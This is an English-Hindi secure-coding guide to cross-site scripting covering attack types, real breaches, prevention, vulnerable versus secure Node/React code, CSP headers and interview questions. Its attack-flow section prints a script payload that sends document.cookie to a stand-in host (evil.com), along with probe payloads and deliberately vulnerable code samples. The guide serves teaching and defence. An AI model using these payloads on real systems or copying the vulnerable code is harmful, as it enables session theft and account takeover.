---

# 046. XSS — What + How it Works (Complete Guide)
# हिंदी में: XSS — Browser में Malicious Code Run करना
# Risk Level: ⛔ Critical

---

## 🔵 Simple Definition (English)
Cross-Site Scripting (XSS) is an attack where malicious JavaScript is injected into a web page and executed in victims' browsers. The attacker's script runs with the same permissions as the legitimate site — allowing it to steal cookies, session tokens, keystrokes, redirect users, or deface the page. It's the #1 most common web vulnerability.

## 🔵 सरल परिभाषा (Hindi)
XSS में attacker malicious JavaScript को web page में inject करता है जो victim के browser में run होती है। यह script legitimate site के permission से चलती है — cookies चुरा सकती है, keystrokes record कर सकती है, या user को malicious site पर redirect कर सकती है।

---

## ⚠️ The Attack / Threat

```
Attack Flow — Stored XSS (Most Dangerous):
─────────────────────────────────────────────────────────
Attacker → Submits malicious comment:
           <script>fetch('https://evil.com?c='+document.cookie)</script>
                ↓
Server → Saves comment to database (unsanitized!)
                ↓
Victim → Loads the page with comments
                ↓
Browser → Executes the <script> tag
                ↓
Victim's cookies → Sent to attacker's server
                ↓
Attacker → Uses stolen session cookie → logs in as victim ☠️

Attack Flow — Reflected XSS:
URL: https://app.com/search?q=<script>alert(document.cookie)</script>
Victim clicks link → server reflects input in response → script executes

Attack Flow — DOM XSS:
https://app.com/#<img src=x onerror=alert(1)>
JavaScript reads location.hash → sets innerHTML → executes without server
```

## ⚠️ हमला कैसे होता है? (Hindi)
Attacker comment box में `<script>document.cookie को evil.com पर भेजने का code</script>` लिखता है। Server इसे save कर लेता है। जो भी user वो page खोलता है, उसके browser में script run होती है और उसकी cookies attacker को मिल जाती हैं।

---

## 💀 Real World Breach Example
**British Airways (2018):** Stored XSS via compromised third-party script (Magecart attack) on the payment page. Attackers injected a script that captured credit card details as users typed. 500,000 customers affected. £20 million GDPR fine (reduced from £183 million). The script ran for 2 months undetected.

**Samy Worm (2005):** MySpace — Samy Kamkar exploited a stored XSS vulnerability to create a self-replicating worm. In 20 hours, 1 million users had unknowingly run the script and added Samy as a friend. Largest XSS attack in history at the time.

---

## 🛡️ How to Prevent — Step by Step

```
Step 1: Encode ALL output — HTML-encode before rendering user content
Step 2: Use textContent not innerHTML for user-generated content
Step 3: Implement Content Security Policy (CSP) headers
Step 4: DOMPurify for sanitizing HTML when HTML is required
Step 5: HttpOnly cookies — scripts can't access them even if XSS occurs
Step 6: Use React/modern frameworks — they encode by default
Step 7: Validate input server-side (whitelist allowed characters)
Step 8: Avoid eval(), new Function(), setTimeout(string) with user data
Step 9: Subresource Integrity (SRI) for third-party scripts
Step 10: Regular XSS scanning in CI/CD (OWASP ZAP, Burp Suite)
```

---

## 💻 Vulnerable Code (What NOT to do)

```javascript
// ❌ VULNERABLE CODE

// ─── Backend (Node.js/Express) — Stored XSS ──────────────────
app.get('/comments', async (req, res) => {
  const comments = await db.query('SELECT * FROM comments');
  
  // ❌ Rendering unsanitized user content directly as HTML
  const html = comments.map(c => `<div>${c.text}</div>`).join('');
  res.send(`<html><body>${html}</body></html>`);
  // Attacker's comment: <script>alert(document.cookie)</script>
  // Gets rendered and executed!
});

// ─── Frontend (React) — DOM XSS ──────────────────────────────
function Comment({ text }) {
  return (
    // ❌ dangerouslySetInnerHTML with unsanitized content
    <div dangerouslySetInnerHTML={{ __html: text }} />
    // If text = '<script>evil()</script>' → executed!
  );
}

// ❌ Vanilla JS DOM manipulation
const searchQuery = new URLSearchParams(window.location.search).get('q');
document.getElementById('result').innerHTML = `Results for: ${searchQuery}`;
// URL: /search?q=<img src=x onerror=alert(document.cookie)>
// → XSS via URL parameter!

// ❌ Template strings in jQuery
$('#result').html(`Welcome, ${username}`);  // jQuery .html() renders HTML
```

---

## 💻 Secure Code (What TO do)

```javascript
// ✅ SECURE CODE

// ─── Backend — Output Encoding ────────────────────────────────
const he = require('he');  // HTML entities encoder

app.get('/comments', async (req, res) => {
  const comments = await db.query('SELECT * FROM comments');
  
  // ✅ Encode HTML entities before rendering
  const html = comments.map(c =>
    `<div>${he.encode(c.text)}</div>`  // < → &lt;  > → &gt;  " → &quot;
  ).join('');
  res.send(`<html><body>${html}</body></html>`);
  // Attacker's <script> becomes &lt;script&gt; — displayed as text, not executed!
});

// ─── Backend — Template engines (escape by default) ──────────
// Handlebars: {{ comment }} auto-escapes
// Pug: #{comment} auto-escapes
// EJS: <%= comment %> auto-escapes (<%- is UN-escaped — avoid!)

// ─── React — Safe by default, dangerous usage ─────────────────
function Comment({ text }) {
  // ✅ React's JSX escapes by default
  return <div>{text}</div>;
  // Even if text = '<script>evil()</script>'
  // React renders it as literal text — not HTML!
}

// ✅ When you NEED HTML (user-authored rich text):
import DOMPurify from 'dompurify';

function RichTextComment({ htmlContent }) {
  const sanitized = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'title'],  // whitelist attributes
    FORBID_TAGS: ['script', 'iframe', 'object'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
  // DOMPurify removes <script> and event handlers
}

// ─── Vanilla JS — Safe DOM manipulation ───────────────────────
// ✅ Use textContent (not innerHTML) for displaying user content
const searchQuery = new URLSearchParams(window.location.search).get('q');
document.getElementById('result').textContent = `Results for: ${searchQuery}`;
// textContent treats everything as text — no HTML parsing

// ✅ For building HTML safely:
const el = document.createElement('div');
el.textContent = userInput;  // safe
container.appendChild(el);

// ─── CSP Header (crucial defense layer) ──────────────────────
// Express.js + Helmet:
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-RANDOM_NONCE'"],  // only our scripts
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],       // no Flash/plugins
    frameAncestors: ["'none'"],  // no embedding (clickjacking protection)
    upgradeInsecureRequests: []
  }
}));
// Even if XSS occurs, CSP blocks inline scripts and external script sources!
```

---

## 🟠 Implementation in My Stack

```javascript
// ─── NestJS — Global XSS protection ──────────────────────────
// main.ts
import helmet from '@fastify/helmet';  // or @nestjs/platform-express + helmet

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  crossOriginEmbedderPolicy: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
}));

// ─── Next.js — Security Headers ───────────────────────────────
// next.config.js
const nextConfig = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: [
            "default-src 'self'",
            "script-src 'self' 'unsafe-eval' 'unsafe-inline'",  // unsafe-eval needed for Next.js dev
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' blob: data: https:",
            "font-src 'self'",
            "object-src 'none'",
            "frame-ancestors 'none'",
          ].join('; ')
        },
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' }
      ]
    }];
  }
};

// ─── Nginx — CSP header ───────────────────────────────────────
// nginx.conf
/*
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';
  frame-ancestors 'none';
" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
*/

// ─── Input sanitization library (server-side) ─────────────────
import { sanitize } from 'class-sanitizer';
import { IsString, MaxLength } from 'class-validator';
import { Sanitize, Trim } from 'class-sanitizer';

export class CreateCommentDto {
  @IsString()
  @MaxLength(1000)
  @Trim()  // remove leading/trailing whitespace
  @Sanitize(xss)  // strip HTML tags
  text: string;
}
```

---

## 🔧 Security Tools + Libraries
| Tool | Purpose | Use |
|------|---------|-----|
| `DOMPurify` | Client-side HTML sanitizer | `DOMPurify.sanitize(html)` |
| `helmet` | Express security headers incl. CSP | `app.use(helmet())` |
| `he` | HTML entity encoder/decoder | `he.encode(userInput)` |
| `xss` (npm) | XSS filter library | Server-side sanitization |
| OWASP ZAP | Dynamic XSS scanner | CI/CD scanning |
| Burp Suite | Manual XSS testing | Penetration testing |
| `validator.js` | Input validation | `validator.escape(str)` |

---

## ⚫ Interview Questions + Answers

**Q1: What are the three types of XSS? Which is most dangerous?**
A1: (1) **Stored/Persistent XSS** — malicious script saved to DB, served to all users. Most dangerous — single injection affects many users. (2) **Reflected XSS** — script in URL reflected in response, victim must click a crafted link. (3) **DOM-based XSS** — script never goes to server, manipulated entirely in browser via `location.hash`, `document.URL`, etc. Stored is most dangerous (no user action after initial injection), DOM-based is hardest to detect (server logs show nothing).

**Q2: How does React prevent XSS and when does it NOT?**
A2: React automatically HTML-encodes all values in JSX expressions `{value}` — `<script>` becomes `&lt;script&gt;` — displayed as text, not executed. React does NOT protect when you use `dangerouslySetInnerHTML` (bypasses encoding), create anchor hrefs from user input (`href={userUrl}` — could be `javascript:`), or use `eval()`. Always use DOMPurify before `dangerouslySetInnerHTML`, validate URLs against `http:` and `https:` scheme only.

**Q3: What is Content Security Policy and how does it prevent XSS?**
A3: CSP is an HTTP header that tells the browser which sources are allowed to execute scripts. `Content-Security-Policy: script-src 'self'` means only scripts from the same origin can run — even if an attacker injects `<script src="https://evil.com/steal.js">`, the browser refuses to load it. CSP with `nonce-based` scripts (`script-src 'nonce-RANDOM'`) blocks all inline scripts except those with matching nonces. CSP is a defense-in-depth measure — doesn't prevent injection but breaks execution.

**Q4: What's the difference between input validation and output encoding for XSS?**
A4: **Input validation** rejects or strips dangerous input at the time of entry (before storage). **Output encoding** converts special characters to HTML entities at the time of display. Both are needed: validation as a first line of defense, encoding as the critical last line before rendering. Rule: encode on OUTPUT, not on input — encoding on input can corrupt data (double encoding, breaks search). The OWASP recommendation is: validate input, encode output, in context (HTML encoding, JS encoding, URL encoding — each context needs different encoding).

**Q5: Can XSS occur even with HttpOnly cookies?**
A5: HttpOnly prevents `document.cookie` from reading those specific cookies — but XSS can still cause significant damage: keystroke logging (capture credentials as typed), form hijacking (steal data before submission), UI modification (fake login overlay), performing actions as the user via `fetch()`/`XMLHttpRequest` (the browser attaches HttpOnly cookies to requests automatically), redirect to phishing site. HttpOnly reduces the damage but doesn't eliminate XSS risk — proper output encoding and CSP are the real defenses.

---

## ✅ Security Checklist
```
□ All user-generated content HTML-encoded before rendering
□ React JSX used for user content (not dangerouslySetInnerHTML without DOMPurify)
□ CSP headers set (script-src 'self', no unsafe-inline)
□ HttpOnly + Secure + SameSite=Strict on session cookies
□ DOMPurify used when rich HTML is needed
□ textContent (not innerHTML) for plain text DOM manipulation
□ URL inputs validated to only allow http/https scheme
□ No eval(), new Function() with user data
□ Third-party scripts use Subresource Integrity (SRI)
□ Regular XSS scanning in CI/CD (OWASP ZAP)
□ Server-side HTML sanitization library for comment/rich-text fields
□ X-Content-Type-Options: nosniff header set
```

---

## 📊 Visual Diagram

```
XSS ATTACK TYPES:

STORED XSS:
Attacker → POST comment "<script>steal()</script>"
              ↓
Database stores malicious script
              ↓
Any user views page → script executes → data stolen

REFLECTED XSS:
Attacker crafts → https://site.com/search?q=<script>evil()</script>
Sends to victim via email/chat
              ↓
Victim clicks → server reflects <script> in response
              ↓
Browser executes → session stolen

DOM XSS:
URL: https://app.com/#<img src=x onerror=steal()>
              ↓
JS reads location.hash → sets innerHTML
              ↓
Browser parses onerror → executes steal() — server never sees it!

DEFENSE LAYERS:
┌─────────────────────────────────────────────────────┐
│  Layer 1: Output Encoding (he.encode / JSX)          │  ← stops rendering
│  Layer 2: DOMPurify (when HTML needed)               │  ← strips malicious tags
│  Layer 3: CSP Header (script-src 'self')             │  ← blocks execution
│  Layer 4: HttpOnly Cookies                           │  ← limits damage
│  Layer 5: Regular scanning (ZAP, Burp)              │  ← detects early
└─────────────────────────────────────────────────────┘
```

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| XSS | Cross-Site Scripting — injecting scripts | Malicious script browser में inject करना |
| Stored XSS | Script saved to database | DB में script save होती है |
| Reflected XSS | Script in URL reflected back | URL से script response में आती है |
| DOM XSS | Script via DOM manipulation | Browser में ही DOM से script चलती है |
| Output Encoding | Convert < > to &lt; &gt; | HTML characters को safe text में बदलना |
| DOMPurify | HTML sanitization library | HTML से dangerous tags हटाना |
| CSP | Content Security Policy | कौन से scripts run हो सकते हैं define करना |
| HttpOnly | Cookie not accessible by JS | Cookie को JavaScript से hide करना |

---

## ⚡ 3-Line Summary
**English:**
1. XSS injects malicious JavaScript into pages, running in victims' browsers with the site's permissions — can steal cookies, keystrokes, or perform actions as the user.
2. Prevention: HTML-encode all output, use React JSX or text-content (not innerHTML), apply DOMPurify when HTML is needed, set CSP headers.
3. Defense in depth: HttpOnly cookies limit damage, CSP blocks script execution, regular scanning catches what developers miss.

**Hindi:**
1. XSS malicious JavaScript को page में inject करता है जो victim के browser में site की permission से run होती है।
2. Fix: output HTML-encode करो, React JSX use करो, DOMPurify से sanitize करो, CSP headers लगाओ।
3. HttpOnly cookies damage limit करती हैं, CSP script execution block करती है।

---

## 🚨 Red Flag Signs
- `res.send()` or `res.render()` with unsanitized `req.body`/`req.query` values
- `dangerouslySetInnerHTML` without DOMPurify
- `element.innerHTML = userInput` in any JavaScript
- No `Content-Security-Policy` header in response
- `$('#el').html(userContent)` in jQuery
- `eval(userInput)` or `setTimeout(userInput, 0)` anywhere
- Third-party scripts without SRI integrity attribute
- User-uploaded SVG files served without sanitization

---

## ➡️ Next Topic
**047. Reflected XSS** — Deep dive into URL-based XSS, how attackers craft malicious links, DOM sinks, and bypass techniques.
